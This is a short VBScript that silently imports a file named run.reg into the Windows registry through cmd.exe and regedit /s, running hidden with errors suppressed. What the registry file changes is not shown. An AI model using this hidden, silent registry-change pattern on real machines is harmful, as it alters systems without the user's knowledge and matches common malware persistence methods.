On Error Resume Next
Dim WSHShell
Set WSHShell = WScript.CreateObject("WScript.Shell")
CreateObject("wscript.shell").run "cmd.exe /c regedit/s " & Chr(34) & "run.reg" & Chr(34),0
